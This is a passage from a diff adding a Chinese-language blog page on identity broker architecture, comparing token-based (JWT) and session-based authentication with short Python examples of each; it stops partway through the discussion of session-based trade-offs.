@@ -1,0 +1,1512 @@
+<!DOCTYPE html><html lang="zh-CN"><head><!-- hexo injector head_begin start --><!-- Google tag (gtag.js) begins-->
+    <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3DZR3TQYCY"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-3DZR3TQYCY');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+    <meta charset="utf-8">
+    <!-- security headers starts -->
+    <!-- meta http-equiv="content-security-policy" content="script-src 'sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=' 'sha256-lJjk3/dvd+wXqRFjV7T5L/nXJXr5NjUjmsKSPEe+ass=';" -->
+    <!-- security headers ends -->
+    <!-- favicon starts -->    
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <!-- favicon ends -->
+    
+
+    
+    <title>身份代理：分布式系统中的集中式身份验证 | Decoding Digital Anomalies</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <meta name="keywords" content="Architecture,Authentication,Security">
+    
+    
+    <meta name="description" content="身份代理在多个系统中集中管理身份验证，但实现选择会影响安全性、性能和用户体验。了解模式、权衡和陷阱。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="身份代理：分布式系统中的集中式身份验证">
+<meta property="og:url" content="https://neo01.com/zh-CN/2021/12/Identity-Broker-Patterns/index.html">
+<meta property="og:site_name" content="Decoding Digital Anomalies">
+<meta property="og:description" content="身份代理在多个系统中集中管理身份验证，但实现选择会影响安全性、性能和用户体验。了解模式、权衡和陷阱。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-23T14:57:12.764Z">
+<meta property="article:author" content="Neo Alienson">
+<meta property="article:tag" content="Architecture">
+<meta property="article:tag" content="Authentication">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+    
+            <link rel="alternate" href="/atom.xml" title="Decoding Digital Anomalies" type="application/atom+xml">
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+        
+
+
+    
+    
+        
+
+
+    
+
+<!-- hexo injector head_end start --><link rel="stylesheet" type="text/css" href="/css/bundle.css"><script type="text/javascript" src="/js/bundle_first.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><style id="admonition-styles">.admonition {
+  margin: 1em 0;
+  padding: 0rem;
+  border-left: 0.3rem solid;
+  border-radius: 0.4rem;
+  background-color: #f9f9f9;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.04);
+  overflow: hidden;
+  page-break-inside: avoid;
+}
+
+.admonition-title {
+  display: flex;
+  align-items: center;
+  font-weight: 600;
+  padding: 0rem 1rem 0.1rem 0.75rem;
+  font-size: 1.05em;
+  background-color: rgba(0, 0, 0, 0.03);
+  border-top-left-radius: 0.4rem;
+  border-top-right-radius: 0.4rem;
+  margin: 0 !important;
+}
+
+.admonition-icon {
+  font-size: 1.2em;
+  margin-right: 0.6rem;
+  opacity: 0.85;
+  margin-top: 0.1rem;
+}
+
+/* 内容区域 margin */
+.admonition > *:not(.admonition-title) {
+  margin: 0.6rem 1rem 0.6rem 1rem;
+}
+
+/* NOTE 类型 */
+.admonition.anote {
+  border-color: #448aff;
+}
+.admonition.anote > .admonition-title {
+  background-color: #448aff1a;
+  color: #2962ff;
+}
+
+/* INFO / TODO 类型 */
+.admonition.info,
+.admonition.todo {
+  border-color: #00b8d4;
+}
+.admonition.info > .admonition-title,
+.admonition.todo > .admonition-title {
+  background-color: rgba(0, 184, 212, 0.1);
+  color: #007c91;
+}
+
+/* 警告类 */
+.admonition.warning,
+.admonition.attention,
+.admonition.caution {
+  border-color: #ff9100;
+}
+.admonition.warning > .admonition-title,
+.admonition.attention > .admonition-title,
+.admonition.caution > .admonition-title {
+  background-color: rgba(255, 145, 0, 0.1);
+  color: #c66900;
+}
+
+/* 错误类 */
+.admonition.failure,
+.admonition.missing,
+.admonition.fail,
+.admonition.error,
+.admonition.danger,
+.admonition.bug {
+  border-color: #ff5252;
+}
+.admonition.failure > .admonition-title,
+.admonition.missing > .admonition-title,
+.admonition.fail > .admonition-title,
+.admonition.error > .admonition-title,
+.admonition.danger > .admonition-title,
+.admonition.bug > .admonition-title {
+  background-color: rgba(255, 82, 82, 0.1);
+  color: #b71c1c;
+}
+
+/* TIP 类型 */
+.admonition.tip {
+  border-color: #00bfa5;
+}
+.admonition.tip > .admonition-title {
+  background-color: #00bfa51a;
+  color: #00796b;
+}
+
+/* SUCCESS 类型 */
+.admonition.success {
+  border-color: #00c853;
+}
+.admonition.success > .admonition-title {
+  background-color: #00c8531a;
+  color: #2e7d32;
+}
+
+/* QUESTION 类型 */
+.admonition.question {
+  border-color: #64dd17;
+}
+.admonition.question > .admonition-title {
+  background-color: #64dd171a;
+  color: #558b2f;
+}
+
+/* EXAMPLE 类型 */
+.admonition.example {
+  border-color: #7c4dff;
+}
+.admonition.example > .admonition-title {
+  background-color: #7c4dff1a;
+  color: #512da8;
+}
+
+/* QUOTE 类型 */
+.admonition.quote {
+  border-color: #9e9e9e;
+}
+.admonition.quote > .admonition-title {
+  background-color: #9e9e9e1a;
+  color: #424242;
+}
+
+/*黑暗模式*/
+/* 夜间模式基础样式 */
+[data-theme="dark"] .admonition {
+  background-color: #1e1e1e;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+}
+
+[data-theme="dark"] .admonition-title {
+  background-color: rgba(255, 255, 255, 0.05);
+}
+
+/* anote */
+[data-theme="dark"] .admonition.anote {
+  border-color: #82b1ff;
+}
+[data-theme="dark"] .admonition.anote > .admonition-title {
+  background-color: #82b1ff1a;
+  color: #bbdefb;
+}
+
+/* tip */
+[data-theme="dark"] .admonition.tip {
+  border-color: #64ffda;
+}
+[data-theme="dark"] .admonition.tip > .admonition-title {
+  background-color: #64ffda1a;
+  color: #1de9b6;
+}
+
+/* success */
+[data-theme="dark"] .admonition.success {
+  border-color: #69f0ae;
+}
+[data-theme="dark"] .admonition.success > .admonition-title {
+  background-color: #69f0ae1a;
+  color: #00e676;
+}
+
+/* question */
+[data-theme="dark"] .admonition.question {
+  border-color: #b2ff59;
+}
+[data-theme="dark"] .admonition.question > .admonition-title {
+  background-color: #b2ff591a;
+  color: #aeea00;
+}
+
+/* example */
+[data-theme="dark"] .admonition.example {
+  border-color: #b388ff;
+}
+[data-theme="dark"] .admonition.example > .admonition-title {
+  background-color: #b388ff1a;
+  color: #b39ddb;
+}
+
+/* quote */
+[data-theme="dark"] .admonition.quote {
+  border-color: #bdbdbd;
+}
+[data-theme="dark"] .admonition.quote > .admonition-title {
+  background-color: #bdbdbd1a;
+  color: #eeeeee;
+}
+
+/* warning / attention / caution */
+[data-theme="dark"] .admonition.warning,
+[data-theme="dark"] .admonition.attention,
+[data-theme="dark"] .admonition.caution {
+  border-color: #ffb300;
+}
+[data-theme="dark"] .admonition.warning > .admonition-title,
+[data-theme="dark"] .admonition.attention > .admonition-title,
+[data-theme="dark"] .admonition.caution > .admonition-title {
+  background-color: #ffb3001a;
+  color: #ffe082;
+}
+
+/* error / fail / failure / bug / danger / missing */
+[data-theme="dark"] .admonition.error,
+[data-theme="dark"] .admonition.fail,
+[data-theme="dark"] .admonition.failure,
+[data-theme="dark"] .admonition.bug,
+[data-theme="dark"] .admonition.missing,
+[data-theme="dark"] .admonition.danger {
+  border-color: #ef5350;
+}
+[data-theme="dark"] .admonition.error > .admonition-title,
+[data-theme="dark"] .admonition.fail > .admonition-title,
+[data-theme="dark"] .admonition.failure > .admonition-title,
+[data-theme="dark"] .admonition.bug > .admonition-title,
+[data-theme="dark"] .admonition.missing > .admonition-title,
+[data-theme="dark"] .admonition.danger > .admonition-title {
+  background-color: #ef53501a;
+  color: #ff8a80;
+}</style></head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" title="Homepage" class="logo"></a>
+                    </h1>
+                        <h2 class="subtitle-wrap">
+                            <p class="title">解码数字异常</p>
+                          <p class="subtitle">有时功能就是数字兔子洞中的错误，反之亦然</p>
+                        </h2>
+                    <div id="lang-selector">
+                        <span class="lang-icon">🌐</span>
+                        
+                            <a href="/2021/12/Identity-Broker-Patterns/" class="lang-link">English</a>
+<span class="lang-sep">|</span>                            <a href="/zh-TW/2021/12/Identity-Broker-Patterns/" class="lang-link">繁體中文</a>
+<span class="lang-sep">|</span>                            <a href="/ja/2021/12/Identity-Broker-Patterns/" class="lang-link">日本語</a>
+                    </div>
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/zh-CN/">主页</a>
+                                </li>
+                                                                    <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/AI/">人工智能</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/AI/Art-Gallery/">艺术画廊</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Architecture/">架构</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Cybersecurity/">网络安全</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Development/">开发</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/zh-CN/categories/Misc/">杂项</a></li></ul>
+                                <li class="main-nav-list-item">
+                                    <a class="main-nav-list-link" href="/zh-CN/about-me">关于</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" id="search-form-input" placeholder="搜索">
+        <button type="submit" title="搜索" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" id="ins-search-input" placeholder="想要查找什么...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script integrity="sha256-B5nfCL2Dym3Ba4YJFI7wB3f4vtClbrYJZ32A5erBEdg=">
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+        LANG: 'zh-CN',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+
+
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Development/">Development</a>
+    </h1>
+</div>
+
+                        <div class="main-body-content">
+                            <article id="post-2021/12/Identity-Broker-Patterns-zh-CN" class="article article-single article-type-post" itemscope="" itemprop="blogPost">
+    <div class="article-inner responsive-content">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        身份代理：分布式系统中的集中式身份验证
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+      <i class="fa fa-calendar"></i>
+        
+          Created <time datetime="2021-12-23T16:00:00.000Z" itemprop="datePublished">2021-12-24</time>
+          &nbsp;<i class="fa fa-calendar"></i>
+          Updated <time datetime="2025-10-23T14:57:12.764Z" itemprop="datePublished">2025-10-23</time>
+        
+    </div>
+
+
+                
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/zh-CN/tags/Architecture/">Architecture</a> <a class="tag-link" href="/zh-CN/tags/Security/">Security</a> <a class="tag-link" href="/zh-CN/tags/Authentication/">Authentication</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3%E8%BA%AB%E4%BB%BD%E4%BB%A3%E7%90%86"><span class="toc-text">理解身份代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BB%A4%E7%89%8C%E4%B8%8E%E5%9F%BA%E4%BA%8E%E4%BC%9A%E8%AF%9D%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-text">基于令牌与基于会话的身份验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E9%80%89%E6%8B%A9%EF%BC%9AOAuth-2-0%E3%80%81SAML-%E5%92%8C-OpenID-Connect"><span class="toc-text">协议选择：OAuth 2.0、SAML 和 OpenID Connect</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%99%B7%E9%98%B1%E5%92%8C%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">常见陷阱和安全问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-text">结论</span></a></li></ol>
+            <p>身份代理作为分布式系统中身份验证蔓延问题的解决方案应运而生。身份代理集中管理这些问题，提供单点登录（SSO）和统一的身份管理，而不是让每个应用程序管理自己的用户凭据和身份验证逻辑。然而，这种集中化引入了新的架构挑战：会话管理复杂性、单点故障以及安全性与用户体验之间的微妙平衡。</p>
+<p>本文探讨了企业系统、云应用程序和微服务架构中的身份代理模式。我们将剖析常见的实现方法，评估 OAuth 2.0、SAML 和 OpenID Connect 之间的协议选择，并理解基于令牌和基于会话的身份验证之间的权衡。通过真实世界的实现和安全事件，我们揭示了为什么身份代理既必不可少又复杂。</p>
+<h2 id="理解身份代理">理解身份代理</h2>
+<p>在深入实现模式之前，理解身份代理的作用以及它们存在的原因至关重要。身份代理位于应用程序和身份提供者之间，转换身份验证协议并管理用户会话。</p>
+<h3 id="核心问题：身份验证蔓延">核心问题：身份验证蔓延</h3>
+<p>没有身份代理时，每个应用程序独立管理身份验证：</p>
+<div class="admonition error"><p class="admonition-title"><span class="mdi mdi-alert-circle-outline admonition-icon"></span>🚫 没有身份代理的问题</p><div class="admonition-content"><p><strong>凭据重复</strong></p>
+<ul>
+<li>用户为每个应用程序维护单独的凭据</li>
+<li>跨系统重用密码会产生安全风险</li>
+<li>密码重置需要联系每个应用程序</li>
+<li>没有统一的密码策略执行</li>
+</ul>
+<p><strong>集成复杂性</strong></p>
+<ul>
+<li>每个应用程序实现自己的身份验证</li>
+<li>与身份提供者的多个集成</li>
+<li>不一致的安全实现</li>
+<li>难以添加新的身份提供者</li>
+</ul>
+<p><strong>用户体验问题</strong></p>
+<ul>
+<li>用户分别登录每个应用程序</li>
+<li>跨系统没有单点登录</li>
+<li>会话管理不一致</li>
+<li>注销不会在应用程序之间传播</li>
+</ul>
+</div></div>
+<p>身份代理通过集中身份验证逻辑并为应用程序提供统一接口来解决这些问题。</p>
+<h3 id="身份代理提供什么">身份代理提供什么</h3>
+<p>身份代理充当应用程序和身份提供者之间的中介：</p>
+<div class="admonition anote"><p class="admonition-title"><span class="mdi mdi-note-outline admonition-icon"></span>🔑 身份代理功能</p><div class="admonition-content"><p><strong>协议转换</strong></p>
+<ul>
+<li>应用程序使用一种协议（例如 OAuth 2.0）</li>
+<li>身份提供者使用不同的协议（SAML、LDAP、OAuth）</li>
+<li>代理在协议之间进行转换</li>
+<li>应用程序不需要特定于提供者的代码</li>
+</ul>
+<p><strong>单点登录（SSO）</strong></p>
+<ul>
+<li>用户使用代理进行一次身份验证</li>
+<li>代理向应用程序颁发令牌/会话</li>
+<li>应用程序信任代理的身份验证</li>
+<li>跨多个应用程序的无缝访问</li>
+</ul>
+<p><strong>身份联合</strong></p>
+<ul>
+<li>连接多个身份提供者</li>
+<li>用户可以使用企业 AD、Google、GitHub 等进行身份验证</li>
+<li>代理规范化用户属性</li>
+<li>跨提供者的统一身份</li>
+</ul>
+<p><strong>会话管理</strong></p>
+<ul>
+<li>集中式会话跟踪</li>
+<li>跨所有应用程序的单点注销</li>
+<li>会话超时策略</li>
+<li>并发会话控制</li>
+</ul>
+</div></div>
+<p>流行的身份代理包括 Keycloak、Auth0、Okta、Azure AD 和 AWS Cognito。</p>
+<h2 id="基于令牌与基于会话的身份验证">基于令牌与基于会话的身份验证</h2>
+<p>身份代理可以使用令牌或会话实现身份验证，每种方式都有不同的权衡。</p>
+<h3 id="基于令牌的身份验证：无状态且可扩展">基于令牌的身份验证：无状态且可扩展</h3>
+<p>基于令牌的身份验证使用加密签名的令牌（通常是 JWT）来表示已验证的用户：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 基于令牌的身份验证流程</span>
+<span class="token keyword">from</span> jose <span class="token keyword">import</span> jwt
+<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta
+
+<span class="token keyword">class</span> <span class="token class-name">TokenAuthBroker</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key
+    
+    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 使用身份提供者验证凭据</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 颁发 JWT 令牌</span>
+            payload <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'sub'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'iat'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'exp'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'roles'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>get_user_roles<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+            token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> token
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">validate_token</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            payload <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> self<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> algorithms<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'HS256'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> payload
+        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>ExpiredSignatureError<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+        <span class="token keyword">except</span> jwt<span class="token punctuation">.</span>JWTError<span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+<span class="token comment"># 应用程序在不联系代理的情况下验证令牌</span>
+<span class="token keyword">def</span> <span class="token function">protected_endpoint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Authorization'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'Bearer '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> broker<span class="token punctuation">.</span>validate_token<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"欢迎 </span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">[</span><span class="token string">'sub'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> <span class="token string">"未授权"</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 基于令牌的优势</p><div class="admonition-content"><p><strong>无状态架构</strong></p>
+<ul>
+<li>不需要服务器端会话存储</li>
+<li>应用程序独立验证令牌</li>
+<li>无需会话复制即可水平扩展</li>
+<li>负载均衡器中不需要会话亲和性</li>
+</ul>
+<p><strong>性能</strong></p>
+<ul>
+<li>每个请求无需数据库查找</li>
+<li>验证是加密签名检查</li>
+<li>减少身份验证检查的延迟</li>
+<li>降低身份代理的负载</li>
+</ul>
+<p><strong>微服务友好</strong></p>
+<ul>
+<li>令牌在服务之间传递</li>
+<li>不需要共享会话存储</li>
+<li>服务独立验证令牌</li>
+<li>解耦架构</li>
+</ul>
+</div></div>
+<p>然而，基于令牌的身份验证有显著的缺点：</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 基于令牌的挑战</p><div class="admonition-content"><p><strong>撤销困难</strong></p>
+<ul>
+<li>令牌在过期前有效</li>
+<li>无法立即撤销被泄露的令牌</li>
+<li>注销不会使现有令牌失效</li>
+<li>需要令牌黑名单（破坏无状态优势）</li>
+</ul>
+<p><strong>令牌大小</strong></p>
+<ul>
+<li>JWT 包含用户数据和声明</li>
+<li>每个请求都发送</li>
+<li>比会话 ID 大</li>
+<li>移动客户端的带宽开销</li>
+</ul>
+<p><strong>安全风险</strong></p>
+<ul>
+<li>令牌存储在浏览器中（XSS 漏洞）</li>
+<li>长期令牌增加暴露窗口</li>
+<li>令牌被盗允许在过期前冒充</li>
+<li>刷新令牌管理复杂性</li>
+</ul>
+</div></div>
+<h3 id="基于会话的身份验证：有状态但可控">基于会话的身份验证：有状态但可控</h3>
+<p>基于会话的身份验证使用服务器端会话，将会话 ID 发送给客户端：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 基于会话的身份验证流程</span>
+<span class="token keyword">import</span> secrets
+<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedelta
+
+<span class="token keyword">class</span> <span class="token class-name">SessionAuthBroker</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>sessions <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># 生产环境：Redis、数据库</span>
+    
+    <span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 使用身份提供者验证凭据</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>verify_credentials<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token comment"># 创建会话</span>
+            session_id <span class="token operator">=</span> secrets<span class="token punctuation">.</span>token_urlsafe<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>sessions<span class="token punctuation">[</span>session_id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">'username'</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
+                <span class="token string">'created'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'expires'</span><span class="token punctuation">:</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                <span class="token string">'roles'</span><span class="token punctuation">:</span> self<span class="token punctuation">.</span>get_user_roles<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+            <span class="token punctuation">}</span>
+            <span class="token keyword">return</span> session_id
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">validate_session</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        session <span class="token operator">=</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">.</span>get<span class="token punctuation">(</span>session_id<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> session <span class="token keyword">and</span> session<span class="token punctuation">[</span><span class="token string">'expires'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> datetime<span class="token punctuation">.</span>utcnow<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> session
+        <span class="token keyword">return</span> <span class="token boolean">None</span>
+    
+    <span class="token keyword">def</span> <span class="token function">revoke_session</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> session_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment"># 立即撤销</span>
+        <span class="token keyword">if</span> session_id <span class="token keyword">in</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">:</span>
+            <span class="token keyword">del</span> self<span class="token punctuation">.</span>sessions<span class="token punctuation">[</span>session_id<span class="token punctuation">]</span>
+            <span class="token keyword">return</span> <span class="token boolean">True</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+<span class="token comment"># 应用程序使用代理检查会话</span>
+<span class="token keyword">def</span> <span class="token function">protected_endpoint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    session_id <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'session_id'</span><span class="token punctuation">)</span>
+    session <span class="token operator">=</span> broker<span class="token punctuation">.</span>validate_session<span class="token punctuation">(</span>session_id<span class="token punctuation">)</span>
+    
+    <span class="token keyword">if</span> session<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"欢迎 </span><span class="token interpolation"><span class="token punctuation">{</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">"</span></span>
+    <span class="token keyword">return</span> <span class="token string">"未授权"</span><span class="token punctuation">,</span> <span class="token number">401</span></code></pre>
+<div class="admonition success"><p class="admonition-title"><span class="mdi mdi-check-circle-outline admonition-icon"></span>✅ 基于会话的优势</p><div class="admonition-content"><p><strong>立即撤销</strong></p>
+<ul>
+<li>会话存储在服务器端</li>
+<li>注销立即使会话失效</li>
+<li>被泄露的会话可以立即撤销</li>
+<li>细粒度的会话控制</li>
+</ul>
+<p><strong>更小的客户端存储</strong></p>
+<ul>
+<li>只有会话 ID 发送给客户端</li>
+<li>最小的带宽开销</li>
+<li>用户数据存储在服务器端</li>
+<li>减少 XSS 暴露</li>
+</ul>
+<p><strong>灵活的会话管理</strong></p>
+<ul>
+<li>无需客户端更改即可更新会话数据</li>
+<li>跟踪会话活动和位置</li>
+<li>实现并发会话限制</li>
+<li>丰富的会话元数据</li>
+</ul>
+</div></div>
+<p>基于会话的身份验证也有权衡：</p>
+<div class="admonition warning"><p class="admonition-title"><span class="mdi mdi-alert-outline admonition-icon"></span>⚠️ 基于会话的挑战</p><div class="admonition-content"><p><strong>可扩展性复杂性</strong></p>
+<ul>
+<li>需要共享会话存储（Redis、数据库）</li>
+<li>跨服务器的会话复制</li>
+<li>负载均衡器会话亲和性或粘性会话</li>
+<li>水平扩展更复杂</li>
+</ul>
